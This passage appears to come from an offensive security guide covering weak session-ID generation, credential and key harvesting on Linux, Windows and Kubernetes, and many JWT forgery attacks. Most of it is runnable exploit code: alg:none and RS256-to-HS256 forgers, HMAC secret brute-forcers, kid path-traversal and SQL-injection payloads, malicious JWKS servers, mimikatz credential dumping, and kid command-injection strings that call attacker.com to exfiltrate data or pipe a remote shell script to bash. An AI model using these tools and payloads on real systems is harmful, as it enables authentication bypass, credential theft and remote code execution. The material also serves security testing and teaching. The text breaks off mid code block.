        # Still predictable
        uniqid_value += f".{random.randint(0, 0xFFFFFFFF):08x}"
    
    return uniqid_value

# Example: Session ID based on timestamp
def crack_timestamp_session(session_id, creation_time_estimate):
    """
    If session_id = hash(timestamp), brute force timestamp
    """
    # Try timestamps around estimated creation time
    for offset in range(-3600, 3600):  # ±1 hour
        test_time = creation_time_estimate + offset
        
        # Try common hash algorithms
        for hash_func in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
            candidate = hash_func(str(test_time).encode()).hexdigest()
            
            if candidate == session_id or candidate[:len(session_id)] == session_id:
                print(f"[+] Session ID seed: {test_time}")
                print(f"    Algorithm: {hash_func().name}")
                return test_time
    
    return None
```

### Insecure Key Storage

**Linux Key Storage Locations:**

```bash
# SSL/TLS certificates and private keys
find /etc/ssl /etc/pki -type f -name "*.key" -o -name "*.pem" 2>/dev/null
find /etc/nginx /etc/apache2 /etc/httpd -name "*.key" -o -name "*.crt" 2>/dev/null

# SSH keys
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find /root/.ssh -type f 2>/dev/null

# Check SSH key permissions (should be 600, often misconfigured)
find /home -name "id_rsa" -exec ls -la {} \; 2>/dev/null

# GPG keys
find /home -name "*.gpg" -o -name "*.pgp" 2>/dev/null
gpg --list-keys
gpg --export-secret-keys

# Application-specific keys
find /var/www -name "*.key" -o -name "*_rsa" -o -name "*.pem" 2>/dev/null
find /opt -name "*.key" 2>/dev/null

# Database encryption keys
find /var/lib/mysql -name "*.pem" 2>/dev/null
find /var/lib/postgresql -name "*.key" 2>/dev/null

# Systemd service environment files
find /etc/systemd/system -name "*.env" -exec cat {} \; 2>/dev/null
systemctl show --property=Environment --all

# Kernel keyrings
keyctl show
keyctl list @u  # User keyring
keyctl list @s  # Session keyring

# Check file permissions
find / -name "*.key" -exec ls -la {} \; 2>/dev/null | grep -v "^-rw-------"
```

**Windows Key Storage Locations:**

```powershell
# Certificate store
certutil -store My
certutil -store Root
Get-ChildItem Cert:\CurrentUser\My
Get-ChildItem Cert:\LocalMachine\My

# Export private keys (if permissions allow)
certutil -exportPFX My <serial_number> output.pfx

# Credential Manager
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# DPAPI Master Keys (encrypted with user password)
dir %APPDATA%\Microsoft\Protect /s
dir %APPDATA%\Microsoft\Credentials /s

# Registry stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software" /f password /t REG_SZ /s
reg query "HKLM\Software" /f password /t REG_SZ /s

# IIS application pool identities
%systemroot%\system32\inetsrv\appcmd list apppool /config

# SSH keys (Windows 10+)
dir %USERPROFILE%\.ssh\id_rsa
dir C:\ProgramData\ssh\ssh_host*key

# Application-specific
dir "C:\Program Files" /s /b | findstr /i ".key .pem _rsa"
dir "C:\inetpub\wwwroot" /s /b | findstr /i ".key .pem"
```

**Memory Extraction:**

```bash
# Linux process memory dump
gcore <pid>                  # Create core dump
strings core.<pid> | grep -i "key\|secret\|password"

# Scan all process memory
grep -a "BEGIN RSA PRIVATE KEY" /proc/*/maps 2>/dev/null

# Use /proc/<pid>/mem to read specific memory regions
cat /proc/<pid>/maps
dd if=/proc/<pid>/mem of=memory.dump bs=1 skip=<start_addr> count=<size>

# volatility for memory analysis
volatility -f memory.dmp --profile=Linux imageinfo
volatility -f memory.dmp --profile=Linux linux_bash
volatility -f memory.dmp --profile=Linux linux_proc_maps

# mimipenguin - extract passwords from memory
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin
./mimipenguin.sh

# Windows memory dumping (requires admin)
# Procdump
procdump.exe -ma <pid> output.dmp

# Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords

# Search memory dump
strings output.dmp | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"
```

**Network Traffic Analysis:**

```bash
# Capture traffic
tcpdump -i eth0 -w capture.pcap

# Search for keys in pcap
strings capture.pcap | grep -i "key\|secret\|password"
strings capture.pcap | grep "BEGIN.*PRIVATE KEY"

# Wireshark filters
# HTTP POST with credentials:
http.request.method == "POST" && http contains "password"

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,extracted/

# SSL/TLS private keys (if RSA key exchange)
# Can decrypt if private key obtained
wireshark capture.pcap
# Edit -> Preferences -> Protocols -> TLS -> RSA keys list

# Search for unencrypted API keys
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri | grep -i "key\|token"
```

**Container and Orchestration Secrets:**

```bash
# Docker secrets
docker secret ls
docker secret inspect <secret_name>

# Docker environment variables
docker inspect <container> | jq '.[0].Config.Env'

# Kubernetes secrets
kubectl get secrets --all-namespaces -o yaml
kubectl get secret <secret-name> -o json | jq -r '.data | map_values(@base64d)'

# Extract from running pod
kubectl exec -it <pod-name> -- env
kubectl exec -it <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Helm values (may contain secrets)
helm get values <release-name>

# Check mounted secrets
kubectl describe pod <pod-name> | grep -A5 "Mounts:"
```

## JWT Cryptographic Issues

### JWT Structure and Components

```
JWT = base64url(header).base64url(payload).base64url(signature)

Header (typ + alg):
{
  "typ": "JWT",
  "alg": "HS256"  // Algorithm: HS256, RS256, ES256, none, etc.
}

Payload (claims):
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "role": "user"
}

Signature:
HMACSHA256(base64url(header) + "." + base64url(payload), secret)
```

**JWT Decoding and Analysis:**

```bash
# jwt_tool - comprehensive JWT testing framework
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
python3 jwt_tool.py -h

# Decode JWT
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.sig

# Online decoder (for quick analysis)
# https://jwt.io

# Command-line decoding
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# jq for JSON formatting
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.sig"
echo $TOKEN | cut -d. -f1 | base64 -d | jq .  # Header
echo $TOKEN | cut -d. -f2 | base64 -d | jq .  # Payload
```

### Algorithm Confusion Attack (alg: none)

**Vulnerability:** JWT libraries accept `"alg": "none"` and skip signature verification.

```bash
# jwt_tool automated test
python3 jwt_tool.py <JWT> -X a

# Test all algorithm confusions
python3 jwt_tool.py <JWT> -X a -X k -X i

# Manual exploitation
python3 << 'EOF'
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def base64url_decode(data):
    padding = '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

# Original JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.signature"

# Decode
header, payload, sig = token.split('.')
header_data = json.loads(base64url_decode(header))
payload_data = json.loads(base64url_decode(payload))

# Modify
header_data['alg'] = 'none'
payload_data['role'] = 'admin'

# Re-encode without signature
new_header = base64url_encode(json.dumps(header_data, separators=(',', ':')).encode())
new_payload = base64url_encode(json.dumps(payload_data, separators=(',', ':')).encode())

# Create malicious JWT (note the trailing dot, empty signature)
malicious_jwt = f"{new_header}.{new_payload}."
print(malicious_jwt)
EOF

# Test with curl
curl -H "Authorization: Bearer <malicious_jwt>" https://target.com/api/admin
```

### Algorithm Confusion Attack (RS256 to HS256)

**Vulnerability:** Server configured to accept RS256 (asymmetric) also accepts HS256 (symmetric). Attacker uses public key as HMAC secret to forge signatures.

**Attack Flow:**

1. Extract public key from certificate or JWKS endpoint
2. Modify JWT header from RS256 to HS256
3. Sign modified payload using public key as HMAC secret
4. Server validates HMAC using same public key (intended as verification key)

**Public Key Extraction:**

```bash
# From X.509 certificate
openssl x509 -in cert.pem -pubkey -noout > public_key.pem

# From modulus and exponent (JWK format)
curl https://target.com/.well-known/jwks.json | jq .

# Download certificate from HTTPS endpoint
openssl s_client -connect target.com:443 < /dev/null | \
  openssl x509 -outform PEM -out cert.pem

# Extract public key
openssl x509 -in cert.pem -pubkey -noout > public.pem

# Convert JWK to PEM
python3 << 'EOF'
import json
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# JWK data
jwk = {
    "kty": "RSA",
    "n": "base64url_encoded_modulus",
    "e": "AQAB"  # Usually 65537
}

# Decode base64url
def base64url_decode(data):
    padding = '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

# Convert to integers
n = int.from_bytes(base64url_decode(jwk['n']), 'big')
e = int.from_bytes(base64url_decode(jwk['e']), 'big')

# Create RSA public key
public_numbers = rsa.RSAPublicNumbers(e, n)
public_key = public_numbers.public_key(default_backend())

# Export to PEM
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open('public_key.pem', 'wb') as f:
    f.write(pem)
    
print("[+] Public key saved to public_key.pem")
EOF
```

**Exploitation with jwt_tool:**

```bash
# Automatic RS256->HS256 attack
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

# With payload modification
python3 jwt_tool.py <JWT_TOKEN> \
  -X k \
  -pk public_key.pem \
  -I \
  -pc "role" \
  -pv "admin"

# Tamper mode with key confusion
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -S hs256 \
  -k public_key.pem
```

**Manual Python Exploitation:**

```python
#!/usr/bin/env python3
import jwt
import json
import sys

def rs256_to_hs256_attack(token, public_key_path):
    """
    Convert RS256 JWT to HS256 using public key as secret
    
    Args:
        token: Original JWT with RS256
        public_key_path: Path to public key PEM file
    """
    
    # Decode without verification
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        print(f"[-] Error decoding JWT: {e}")
        return None
    
    print(f"[*] Original algorithm: {header.get('alg')}")
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
    
    # Modify payload (example: privilege escalation)
    payload['role'] = 'admin'
    payload['isAdmin'] = True
    
    # Read public key (will be used as HMAC secret)
    with open(public_key_path, 'rb') as f:
        public_key = f.read()
    
    print(f"[*] Using public key as HMAC secret ({len(public_key)} bytes)")
    
    # Create new JWT with HS256
    try:
        new_token = jwt.encode(
            payload,
            public_key,
            algorithm='HS256',
            headers={"typ": "JWT", "kid": header.get('kid')}
        )
        
        print(f"\n[+] Forged JWT (HS256):")
        print(new_token)
        
        return new_token
        
    except Exception as e:
        print(f"[-] Error creating JWT: {e}")
        return None

def test_variations(token, public_key_path):
    """Test multiple public key format variations"""
    
    with open(public_key_path, 'rb') as f:
        public_key_raw = f.read()
    
    # Try different key formats
    variations = [
        ("Raw PEM", public_key_raw),
        ("Stripped PEM", public_key_raw.replace(b'-----BEGIN PUBLIC KEY-----', b'').replace(b'-----END PUBLIC KEY-----', b'').replace(b'\n', b'')),
        ("Base64 decoded", None)  # Placeholder
    ]
    
    payload = jwt.decode(token, options={"verify_signature": False})
    payload['role'] = 'admin'
    
    for desc, key_data in variations:
        if key_data is None:
            continue
            
        try:
            new_token = jwt.encode(payload, key_data, algorithm='HS256')
            print(f"\n[*] {desc} format:")
            print(new_token)
        except Exception as e:
            print(f"[-] {desc} failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <JWT> <public_key.pem>")
        sys.exit(1)
    
    token = sys.argv[1]
    public_key = sys.argv[2]
    
    forged = rs256_to_hs256_attack(token, public_key)
    
    # Test variations if primary attack fails
    if forged:
        print("\n[*] Test this token with:")
        print(f"curl -H 'Authorization: Bearer {forged}' https://target.com/api/endpoint")
    else:
        print("\n[*] Trying alternative key formats...")
        test_variations(token, public_key)
```

**Testing the Forged Token:**

```bash
# With curl
curl -v -H "Authorization: Bearer <forged_jwt>" https://target.com/api/admin

# With Burp Suite
# 1. Intercept request
# 2. Replace Authorization header value
# 3. Forward and observe response

# Automated testing
python3 << 'EOF'
import requests
import jwt

# Original token
original_token = "eyJhbGci..."

# Forged token
forged_token = "eyJhbGci..."  # From attack script

# Test endpoint
url = "https://target.com/api/user/profile"

# Compare responses
r1 = requests.get(url, headers={"Authorization": f"Bearer {original_token}"})
r2 = requests.get(url, headers={"Authorization": f"Bearer {forged_token}"})

print(f"Original response: {r1.status_code}")
print(f"Forged response: {r2.status_code}")

if r2.status_code == 200:
    print("[+] Forged token accepted!")
    print(r2.text[:200])
EOF
```

### Weak HMAC Secret Brute Force

**Using jwt_tool:**

```bash
# Brute force with wordlist
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets
python3 jwt_tool.py <JWT> -C -d jwt_secrets.txt

# Create custom wordlist for application
cat > jwt_wordlist.txt << EOF
secret
jwt_secret
your_secret_key
secretkey
changeme
password
123456
admin
api_key
jwt
token
EOF

python3 jwt_tool.py <JWT> -C -d jwt_wordlist.txt
```

**Using Hashcat:**

```bash
# Convert JWT to hashcat format
python3 jwt_tool.py <JWT> -C hashcat

# Or manually extract
echo "eyJhbGci...header.payload.signature" > jwt.txt

# Run hashcat (mode 16500 for JWT)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (if secret format known)
# Example: 8 lowercase letters
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l?l?l

# Combination attack
hashcat -a 1 -m 16500 jwt.txt wordlist1.txt wordlist2.txt

# Show cracked secrets
hashcat -m 16500 jwt.txt --show
```

**Using John the Ripper:**

```bash
# Convert to John format
python3 << 'EOF'
import sys
import base64

token = sys.argv[1] if len(sys.argv) > 1 else input("JWT: ")

parts = token.split('.')
if len(parts) != 3:
    print("Invalid JWT format")
    sys.exit(1)

# John format: jwt_token_value#base64(header.payload)
data = f"{parts[0]}.{parts[1]}"
print(f"{token}#{data}")
EOF

# Save output to file
python3 jwt_to_john.py <JWT> > jwt_john.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt jwt_john.txt

# Incremental mode
john --incremental jwt_john.txt

# Show cracked passwords
john --show jwt_john.txt
```

**Custom Python Brute Force:**

```python
#!/usr/bin/env python3
import jwt
import sys
import itertools
import string
from multiprocessing import Pool, cpu_count

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

def try_secret(secret):
    """Attempt to verify JWT with given secret"""
    try:
        jwt.decode(TOKEN, secret, algorithms=['HS256', 'HS384', 'HS512'])
        return secret
    except jwt.InvalidSignatureError:
        return None
    except Exception:
        return None

def brute_force_wordlist(wordlist_path, threads=None):
    """Brute force using wordlist"""
    if threads is None:
        threads = cpu_count()
    
    print(f"[*] Loading wordlist: {wordlist_path}")
    
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        secrets = [line.strip() for line in f]
    
    print(f"[*] Testing {len(secrets)} secrets with {threads} threads")
    
    with Pool(threads) as pool:
        for i, result in enumerate(pool.imap_unordered(try_secret, secrets, chunksize=1000)):
            if result:
                print(f"\n[+] Secret found: {result}")
                pool.terminate()
                return result
            
            if i % 10000 == 0:
                print(f"\r[*] Tested: {i}/{len(secrets)}", end='', flush=True)
    
    print("\n[-] Secret not found in wordlist")
    return None

def brute_force_charset(charset, min_len=1, max_len=8):
    """Brute force using character set"""
    print(f"[*] Brute forcing with charset: {charset}")
    print(f"[*] Length range: {min_len}-{max_len}")
    
    for length in range(min_len, max_len + 1):
        print(f"\n[*] Testing length {length}")
        count = 0
        
        for attempt in itertools.product(charset, repeat=length):
            secret = ''.join(attempt)
            result = try_secret(secret)
            
            if result:
                print(f"\n[+] Secret found: {result}")
                return result
            
            count += 1
            if count % 1000 == 0:
                print(f"\r[*] Tested: {count}", end='', flush=True)
    
    print("\n[-] Secret not found")
    return None

def try_common_patterns():
    """Try common JWT secret patterns"""
    
    # Extract info from JWT payload
    try:
        payload = jwt.decode(TOKEN, options={"verify_signature": False})
        username = payload.get('sub') or payload.get('username') or payload.get('user')
        email = payload.get('email')
        
        patterns = [
            'secret', 'jwt_secret', 'your_secret_key', 'secretkey',
            'changeme', 'password', '123456', 'admin', 'jwt', 'token',
            'your-256-bit-secret', 'my-secret', 'secret-key',
            f"{username}_secret" if username else None,
            f"{email}_key" if email else None,
        ]
        
        # Filter None values
        patterns = [p for p in patterns if p]
        
        print(f"[*] Trying {len(patterns)} common patterns")
        
        for pattern in patterns:
            result = try_secret(pattern)
            if result:
                print(f"[+] Secret found: {result}")
                return result
                
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

if __name__ == "__main__":
    print("[*] JWT HMAC Secret Brute Force")
    print(f"[*] Token: {TOKEN[:50]}...")
    
    # Try common patterns first
    print("\n[*] Step 1: Testing common patterns")
    result = try_common_patterns()
    if result:
        sys.exit(0)
    
    # Try wordlist if provided
    if len(sys.argv) > 1:
        print(f"\n[*] Step 2: Wordlist attack")
        result = brute_force_wordlist(sys.argv[1])
        if result:
            sys.exit(0)
    
    # Brute force short secrets
    print("\n[*] Step 3: Brute force short secrets (1-4 chars)")
    result = brute_force_charset(string.ascii_lowercase + string.digits, 1, 4)
    if result:
        sys.exit(0)
    
    print("\n[-] All attempts failed")
```

**Optimized C Implementation:**

```bash
# Compile optimized brute forcer
cat > jwt_crack.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>

int verify_jwt(const char *token, const char *secret) {
    // Split token
    char token_copy[4096];
    strncpy(token_copy, token, sizeof(token_copy)-1);
    
    char *header = strtok(token_copy, ".");
    char *payload = strtok(NULL, ".");
    char *signature = strtok(NULL, ".");
    
    if (!header || !payload || !signature) return 0;
    
    // Create message (header.payload)
    char message[4096];
    snprintf(message, sizeof(message), "%s.%s", header, payload);
    
    // Compute HMAC-SHA256
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int digest_len;
    
    HMAC(EVP_sha256(), secret, strlen(secret),
         (unsigned char*)message, strlen(message),
         digest, &digest_len);
    
    // Base64url encode and compare
    // (Simplified - actual implementation needs proper base64url encoding)
    
    return 0;  // Implementation incomplete
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <jwt> <wordlist>\n", argv[0]);
        return 1;
    }
    
    const char *token = argv[1];
    const char *wordlist = argv[2];
    
    FILE *f = fopen(wordlist, "r");
    if (!f) {
        perror("fopen");
        return 1;
    }
    
    char secret[256];
    while (fgets(secret, sizeof(secret), f)) {
        secret[strcspn(secret, "\n")] = 0;  // Remove newline
        
        if (verify_jwt(token, secret)) {
            printf("[+] Secret found: %s\n", secret);
            fclose(f);
            return 0;
        }
    }
    
    printf("[-] Secret not found\n");
    fclose(f);
    return 1;
}
EOF

gcc -o jwt_crack jwt_crack.c -lssl -lcrypto -O3
./jwt_crack <JWT> wordlist.txt
```

### JWT Header Parameter Injection

**kid (Key ID) Parameter Exploitation:**

The `kid` header parameter specifies which key to use for verification. Vulnerable implementations may:

1. Use `kid` in file path operations (path traversal)
2. Use `kid` in SQL queries (SQL injection)
3. Allow arbitrary values (command injection)

**Path Traversal via kid:**

```bash
# jwt_tool automated injection
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# Test various paths
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../etc/passwd" -S hs256 -p ""

# If /dev/null works, server uses empty file as key
# Sign with empty string
python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""
```

**Manual Path Traversal Exploitation:**

```python
#!/usr/bin/env python3
import jwt
import json

def kid_path_traversal(original_token, target_file, file_contents=None):
    """
    Exploit kid parameter for path traversal
    
    Args:
        original_token: Original JWT
        target_file: Path to inject in kid (e.g., /dev/null, /etc/passwd)
        file_contents: Known contents of target file (for signing)
    """
    
    # Decode original token
    payload = jwt.decode(original_token, options={"verify_signature": False})
    header = jwt.get_unverified_header(original_token)
    
    print(f"[*] Original kid: {header.get('kid', 'none')}")
    
    # Modify payload
    payload['role'] = 'admin'
    
    # Path traversal payloads
    traversal_paths = [
        "../../../../../dev/null",
        "../../../../../../dev/null",
        "/dev/null",
        "../../../../../etc/passwd",
        "../../../../proc/self/environ",
        target_file
    ]
    
    results = []
    
    for path in traversal_paths:
        # If file contents known, use as HMAC secret
        if file_contents is not None:
            secret = file_contents
        elif "null" in path:
            secret = ""  # /dev/null contains nothing
        else:
            secret = "unknown"  # Placeholder
        
        try:
            token = jwt.encode(
                payload,
                secret,
                algorithm='HS256',
                headers={"kid": path, "typ": "JWT"}
            )
            
            results.append({
                "kid": path,
                "token": token,
                "secret_used": repr(secret)
            })
            
        except Exception as e:
            print(f"[-] Error with {path}: {e}")
    
    return results

# Example usage
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Test /dev/null (empty file)
tokens = kid_path_traversal(original, "/dev/null")

print("\n[+] Generated tokens:")
for result in tokens:
    print(f"\nkid: {result['kid']}")
    print(f"Secret: {result['secret_used']}")
    print(f"Token: {result['token']}")
    print(f"\nTest with:")
    print(f"curl -H 'Authorization: Bearer {result['token']}' https://target.com/api")
```

**SQL Injection via kid:**

```python
#!/usr/bin/env python3
import jwt

def kid_sqli(original_token):
    """Generate JWTs with SQL injection payloads in kid"""
    
    payload = jwt.decode(original_token, options={"verify_signature": False})
    payload['role'] = 'admin'
    
    # SQL injection payloads
    # Assuming query like: SELECT key FROM keys WHERE kid = '$kid'
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT 'secret' --",
        "' UNION SELECT 'known_secret' --",
        "admin' --",
        "' OR 1=1 LIMIT 1 --",
    ]
    
    results = []
    
    for sqli in sqli_payloads:
        # Try multiple possible secrets that might be returned
        test_secrets = ['secret', 'known_secret', '', 'admin', '123456']
        
        for secret in test_secrets:
            try:
                token = jwt.encode(
                    payload,
                    secret,
                    algorithm='HS256',
                    headers={"kid": sqli, "typ": "JWT"}
                )
                
                results.append({
                    "sqli_payload": sqli,
                    "secret_attempt": secret,
                    "token": token
                })
            except:
                pass
    
    return results

# Generate tokens
tokens = kid_sqli("original_token_here")

print("[+] SQL Injection JWT tokens:")
for t in tokens:
    print(f"\nPayload: {t['sqli_payload']}")
    print(f"Secret: {t['secret_attempt']}")
    print(f"Token: {t['token'][:50]}...")
```

**Command Injection via kid:**

```python
#!/usr/bin/env python3
import jwt

def kid_command_injection(original_token):
    """Generate JWTs with command injection in kid"""
    
    payload = jwt.decode(original_token, options={"verify_signature": False})
    
    # Command injection payloads
    # If server executes: system("cat keys/" . $kid)
    cmd_payloads = [
        "key.txt; whoami",
        "key.txt | nc attacker.com 4444",
        "key.txt; curl http://attacker.com/?c=$(whoami)",
        "$(curl http://attacker.com/shell.sh | bash)",
    ]
    
    for cmd in cmd_payloads:
        token = jwt.encode(
            payload,
            "placeholder",  # Secret unknown, focus on exploitation
            algorithm='HS256',
            headers={"kid": cmd, "typ": "JWT"}
        )
        
        print(f"\n[*] Command: {cmd}")
        print(f"Token: {token}")

# Example
kid_command_injection("original_token")
```

### JKU/X5U Header Injection

**jku (JWK Set URL):** Specifies URL where server fetches JSON Web Key Set for verification.

**x5u (X.509 URL):** Specifies URL for X.509 certificate chain.

**Attack:** Point these parameters to attacker-controlled server hosting malicious keys.

**Setup Malicious JWKS Server:**

```python
#!/usr/bin/env python3
from flask import Flask, jsonify
from jwcrypto import jwk
import json

app = Flask(__name__)

# Generate RSA key pair
key = jwk.JWK.generate(kty='RSA', size=2048)
public_jwk = json.loads(key.export_public())
private_key = key.export_to_pem(private_key=True, password=None)

# Save private key for signing
with open('malicious_private.pem', 'wb') as f:
    f.write(private_key)

print(f"[+] Key ID (kid): {key.key_id}")

@app.route('/.well-known/jwks.json')
def jwks():
    """Serve malicious JWKS"""
    return jsonify({
        "keys": [public_jwk]
    })

@app.route('/health')
def health():
    return "OK"

if __name__ == '__main__':
    print("[*] Starting malicious JWKS server on port 8000")
    print(f"[*] JWKS URL: http://YOUR_IP:8000/.well-known/jwks.json")
    app.run(host='0.0.0.0', port=8000)
```

**Generate Malicious JWT:**

```python
#!/usr/bin/env python3
import jwt
import json

# Load private key
with open('malicious_private.pem', 'rb') as f:
    private_key = f.read()

# Create malicious payload
payload = {
    "sub": "admin",
    "role": "superadmin",
    "iat": 1234567890,
    "exp": 9999999999
}

# Generate JWT with jku header
malicious_token = jwt.encode(
    payload,
    private_key,
    algorithm='RS256',
    headers={
        "typ": "JWT",
        "jku": "http://attacker.com:8000/.well-known/jwks.json",
        "kid": "your_key_id_here"  # Match key ID from JWKS
    }
)

print(f"[+] Malicious JWT:")
print(malicious_token)
print(f"\n[*] Use with:")
print(f"curl -H 'Authorization: Bearer {malicious_token}' https://target.com/api")
```

**Using jwt_tool:**

```bash
# Inject custom jku
python3 jwt_tool.py <JWT> -I -hc jku -hv "http://attacker.com/jwks.json" -X k

# Generate complete attack
python3 jwt_tool.py <JWT> -X i

# This generates:
# 1. RSA key pair
# 2. JWKS JSON file
# 3. Modified JWT with jku header
# Host JWKS file on your server
```

**X5U Certificate Chain Attack:**

```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Convert to DER format (for x5c header)
openssl x509 -in cert.pem -outform DER -out cert.der

# Host certificate
python3 -m http.server 8000

# Generate JWT with x5u
python3 << 'EOF'
import jwt

with open('key.pem', 'rb') as f:
    private_key = f.read()

payload = {"sub": "admin", "role": "admin"}

token = jwt.encode(
    payload,
    private_key,
    algorithm='RS256',
    headers={
        "typ": "JWT",
        "x5u": "http://attacker.com:8000/cert.pem"
    }
)

print(token)
EOF
```

### JWT Expiration and Timing Issues

**Remove exp Claim:**

```python
#!/usr/bin/env python3
import jwt
import time

def remove_expiration(token, secret=None):
    """Remove expiration claim from JWT"""
    
    # Decode without verification
    payload = jwt.decode(token, options={"verify_signature": False})
    header = jwt.get_unverified_header(token)
    
    print(f"[*] Original exp: {payload.get('exp')}")
    
    # Remove expiration
    if 'exp' in payload:
        del payload['exp']
    
    # If secret known, re-sign
    if secret:
        new_token = jwt.encode(payload, secret, algorithm=header['alg'])
        return new_token
    else:
        print("[-] Secret unknown, cannot re-sign")
        return None

# Test
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
modified = remove_expiration(token, secret="known_secret")
```

**Extend Expiration:**

```python
#!/usr/bin/env python3
import jwt
import time

def extend_expiration(token, secret, years=10):
    """Extend JWT expiration far into future"""
    
    payload = jwt.decode(token, options={"verify_signature": False})
    header = jwt.get_unverified_header(token)
    
    # Set expiration 10 years from now
    payload['exp'] = int(time.time()) + (years * 365 * 24 * 3600)
    
    # Also update iat if present
    if 'iat' in payload:
        payload['iat'] = int(time.time())
    
    new_token = jwt.encode(payload, secret, algorithm=header['alg'])
    
    print(f"[+] New expiration: {payload['exp']}")
    print(f"[+] Expires: {time.ctime(payload['exp'])}")
    
    return new_token
```

**Test Expiration Validation:**

```python
#!/usr/bin/env python3
import requests
import jwt
import time

def test_exp_validation(url, token, headers=None):
    """Test if server validates expiration"""
    
    if headers is None:
        headers = {}
    
    # Test 1: Use expired token
    payload = jwt.decode(token, options={"verify_signature": False})
    payload['exp'] = int(time.time()) - 3600  # Expired 1 hour ago
    
    print("[*] Test 1: Expired token")
    # Can't re-sign without secret, but test if server checks
    
    # Test 2: Token without exp
    print("[*] Test 2: Token without exp claim")
    
    # Test 3: Far future expiration
    print("[*] Test 3: Far future expiration")
    payload['exp'] = int(time.time()) + (100 * 365 * 24 * 3600)  # 100 years
    
    # Send requests and analyze responses
    # (Implementation depends on having valid secret)
```

### JWT Null Signature Bypass

**Vulnerability:** Some libraries accept JWT with empty signature component.

```python
#!/usr/bin/env python3
import base64
import json

def create_null_sig_jwt(payload_data):
    """Create JWT with null/empty signature"""
    
    # Header with algorithm
    header = {"alg": "HS256", "typ": "JWT"}
    
    def base64url_encode(data):
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).decode().rstrip('=')
    
    encoded_header = base64url_encode(header)
    encoded_payload = base64url_encode(payload_data)
    
    # Test variations
    variations = [
        f"{encoded_header}.{encoded_payload}.",           # Trailing dot, empty sig
        f"{encoded_header}.{encoded_payload}",            # No signature at all
        f"{encoded_header}.{encoded_payload}..",          # Double dot
        f"{encoded_header}.{encoded_payload}.null",       # Literal "null"
        f"{encoded_header}.{encoded_payload}.AA==",       # Base64 null bytes
    ]
    
    return variations

# Example usage
payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1234567890
}

tokens = create_null_sig_jwt(payload)

print("[+] Null signature JWT variations:")
for i, token in enumerate(tokens, 1):
    print(f"\n[{i}] {token}")
    print(f"    Test: curl -H 'Authorization: Bearer {token}' https://target.com/api")
```

**Using jwt_tool for Null Signature:**

```bash
# Automated null signature tests
python3 jwt_tool.py <JWT> -X n

# Blank password test
python3 jwt_tool.py <JWT> -X b

# Combined tests
python3 jwt_tool.py <JWT> -X a -X n -X b
```

### JWT CVE Exploits

**CVE-2015-9235 (Node.js jsonwebtoken library):**

Vulnerable versions accept tokens without signature verification when algorithm is not specified.

```javascript
// Vulnerable code (jsonwebtoken < 4.2.2)
jwt.verify(token, secret);  // Missing algorithm specification

// Exploitation
// Send JWT with "alg": "none" - accepted without verification
```

**CVE-2018-0114 (Cisco Products):**

[Inference] Multiple Cisco products were reported to use hard-coded JWT secrets.

```bash
